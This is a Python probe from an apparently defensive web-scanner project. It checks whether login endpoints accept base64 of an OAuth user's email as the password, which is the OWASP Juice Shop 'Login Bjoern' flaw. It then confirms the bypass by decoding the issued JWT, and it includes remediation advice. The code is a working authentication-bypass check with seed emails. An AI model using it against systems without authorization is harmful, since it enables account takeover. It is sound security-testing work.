#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: OAuth fallback derives the user's password from their
email address.

A subset of apps that ship an OAuth flow (Sign in with Google, etc.)
auto-create a local user record on first OAuth login and pick the
local password from a deterministic transform of the email — most
commonly base64(email). Login then accepts that derived password
forever, even when the OAuth handshake is bypassed entirely. This is
the bug that lights up the Juice Shop "Login Bjoern" challenge.

This bug class is application-specific — no scanner has a signature
for "password = base64(email)". The high-fidelity probe is to:
  1. Identify OAuth-style email accounts on the target (we use a
     known-good seed first).
  2. Try the derived password.
  3. Confirm we got a valid session by decoding the JWT and asserting
     the issued account matches the supplied email.

Detection signal:
  POST /rest/user/login {email: <oauth_email>, password: base64(email)}
  → 200 with a JWT whose `data.email` equals the supplied email.

Tested against:
  + OWASP Juice Shop  bjoern@owasp.org / base64('bjoern@owasp.org')
                      → validated=True (Login Bjoern challenge).
  + nginx default site → validated=False
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

LOGIN_PATHS = (
    "/rest/user/login",
    "/api/auth/login",
    "/api/login",
)

# Known OAuth-shaped seed emails. The Juice Shop challenge uses
# bjoern@owasp.org; other targets that ship the same auth library
# may use other names (the canonical Juice Shop OAuth account is
# bjoern.kimminich@gmail.com on some builds — we try both).
DEFAULT_OAUTH_EMAILS = (
    "bjoern@owasp.org",
    "bjoern.kimminich@gmail.com",
    "bjoern.kimminich@googlemail.com",
)


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode("ascii"))


def _decode_jwt(token: str) -> dict | None:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        return json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None


def _extract_jwt(doc) -> str | None:
    if not isinstance(doc, dict):
        return None
    for k in ("token", "access_token", "id_token"):
        if isinstance(doc.get(k), str):
            return doc[k]
    for v in doc.values():
        if isinstance(v, dict):
            for k in ("token", "access_token", "id_token"):
                if isinstance(v.get(k), str):
                    return v[k]
            auth = v.get("authentication")
            if isinstance(auth, dict) and isinstance(auth.get("token"), str):
                return auth["token"]
    return None


def _email_in_jwt(payload: dict, email: str) -> bool:
    """Return True iff `email` appears in any string field of the
    decoded JWT payload (top-level or one-level nested)."""
    needle = email.lower()
    def _scan(d: dict) -> bool:
        for v in d.values():
            if isinstance(v, str) and needle in v.lower():
                return True
        return False
    if _scan(payload):
        return True
    for v in payload.values():
        if isinstance(v, dict) and _scan(v):
            return True
    return False


class OauthPasswordFromEmailProbe(Probe):
    name = "auth_oauth_password_from_email"
    summary = ("Detects OAuth fallback that uses base64(email) as the "
               "local password.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--email", action="append", default=[],
            help="Additional OAuth email to test (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        emails = list(DEFAULT_OAUTH_EMAILS) + list(args.email or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for email in emails:
            # base64(email) is the canonical Juice Shop transform —
            # standard-base64, no URL-safe variant, no padding stripped.
            pw = base64.b64encode(email.encode("utf-8")).decode("ascii")
            for path in LOGIN_PATHS:
                url = urljoin(origin, path)
                body = json.dumps({"email": email, "password": pw}).encode()
                r = client.request("POST", url, headers={
                    "Content-Type": "application/json",
                }, body=body)
                row: dict = {"login_path": path, "email": email,
                             "derived_password": pw,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    try:
                        doc = json.loads(r.text)
                    except json.JSONDecodeError:
                        attempts.append(row); continue
                    token = _extract_jwt(doc)
                    if token:
                        payload = _decode_jwt(token) or {}
                        if _email_in_jwt(payload, email):
                            row["derived_login_succeeded"] = True
                            confirmed = row
                            attempts.append(row)
                            break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: OAuth password-derivation flaw on "
                         f"{origin}{confirmed['login_path']} — supplying "
                         f"`base64({confirmed['email']!r})` as the "
                         "password issued a valid session for that "
                         "account."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "When auto-creating a local account from an OAuth "
                    "handshake, store a randomly-generated, "
                    "cryptographically-strong placeholder password — "
                    "never a deterministic transform of any user "
                    "attribute. Better still: refuse local password "
                    "login for OAuth-only accounts entirely (gate the "
                    "endpoint on a `local_password_set: true` flag the "
                    "OAuth flow leaves false).\n"
                    "Audit existing accounts: any user record where "
                    "the stored hash matches `bcrypt(base64(email))` "
                    "may have been compromised through this path."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested base64(email) login against "
                     f"{len(emails)} OAuth-shaped emails on {origin}; "
                     "none produced a valid session."),
            evidence=evidence,
        )


if __name__ == "__main__":
    OauthPasswordFromEmailProbe().main()
